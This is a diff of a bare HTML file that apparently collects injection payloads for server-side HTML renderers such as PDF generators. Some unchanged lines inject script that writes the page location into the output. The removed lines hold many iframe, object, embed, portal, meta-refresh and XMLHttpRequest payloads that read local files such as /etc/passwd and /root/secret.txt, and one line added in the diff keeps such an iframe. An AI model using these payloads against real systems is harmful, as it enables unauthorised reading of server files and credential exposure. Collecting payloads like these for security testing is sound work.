@@ -1,30 +1,8 @@
 <html>
-<iframe src=file:///etc/passwd></iframe>
 <img src="x" onerror="document.write('test')" />
 <script>document.write(JSON.stringify(window.location))</script>
 <script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>
 <img src="x" onerror="document.write(window.location)" />
 <script> document.write(window.location) </script>
-<script>
-x=new XMLHttpRequest;
-x.onload=function(){document.write(btoa(this.responseText))};
-x.open("GET","file:///etc/passwd");x.send();
-</script>
-  <script>
-    xhzeem = new XMLHttpRequest();
-    xhzeem.onload = function(){document.write(this.responseText);}
-    xhzeem.onerror = function(){document.write('failed!')}
-    xhzeem.open("GET","file:///etc/passwd");
-    xhzeem.send();
-</script>
-  <iframe src=file:///etc/passwd></iframe>
-<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
-<link rel=attachment href="file:///root/secret.txt">
-<object data="file:///etc/passwd">
-<portal src="file:///etc/passwd" id=portal>
-<embed src="file:///etc/passwd>" width="400" height="400">
-<style><iframe src="file:///etc/passwd"> 
-<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
-<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
-  <annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
+<iframe src=file:///etc/passwd></iframe>
 </html>
